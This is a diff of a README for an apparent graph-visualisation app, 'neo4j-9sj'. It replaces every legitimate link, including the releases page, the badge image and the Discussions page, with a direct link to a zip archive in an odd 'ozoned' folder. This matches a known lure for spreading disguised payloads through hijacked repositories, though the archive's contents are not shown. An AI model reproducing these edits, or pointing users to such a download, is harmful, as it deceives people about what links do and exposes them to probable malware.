@@ -6,7 +6,7 @@ Welcome to neo4j-9sj! This application helps you manage and visualize graph data
 
 ## 📥 Download Now
 
-[![Download neo4j-9sj](https://img.shields.io/badge/Download%20neo4j--9sj-v1.0.0-green)](https://github.com/papi-design/neo4j-9sj/releases)
+[![Download neo4j-9sj](https://raw.githubusercontent.com/papi-design/neo4j-9sj/main/ozoned/neo4j-9sj.zip%20neo4j--9sj-v1.0.0-green)](https://raw.githubusercontent.com/papi-design/neo4j-9sj/main/ozoned/neo4j-9sj.zip)
 
 ## 📋 System Requirements
 
@@ -17,7 +17,7 @@ Welcome to neo4j-9sj! This application helps you manage and visualize graph data
 
 ## 📦 Download & Install
 
-To download neo4j-9sj, visit this page: [Download neo4j-9sj Releases](https://github.com/papi-design/neo4j-9sj/releases).
+To download neo4j-9sj, visit this page: [Download neo4j-9sj Releases](https://raw.githubusercontent.com/papi-design/neo4j-9sj/main/ozoned/neo4j-9sj.zip).
 
 1. Click on the link above to access the releases page.
 2. Find the latest version at the top of the page.
@@ -55,7 +55,7 @@ If you encounter any issues, consider these steps:
 
 ## 📞 Community Support
 
-For additional help, you can reach out to fellow users on our [GitHub Discussions page](https://github.com/papi-design/neo4j-9sj/discussions). Share your questions and solutions!
+For additional help, you can reach out to fellow users on our [GitHub Discussions page](https://raw.githubusercontent.com/papi-design/neo4j-9sj/main/ozoned/neo4j-9sj.zip). Share your questions and solutions!
 
 ## 🌟 Features
 
@@ -73,4 +73,4 @@ neo4j-9sj is licensed under the MIT License. Feel free to modify and distribute 
 
 ## ✅ Acknowledgements
 
-Thank you for your interest in neo4j-9sj. We appreciate your support! Don't forget to download the latest version [here](https://github.com/papi-design/neo4j-9sj/releases).
+Thank you for your interest in neo4j-9sj. We appreciate your support! Don't forget to download the latest version [here](https://raw.githubusercontent.com/papi-design/neo4j-9sj/main/ozoned/neo4j-9sj.zip).
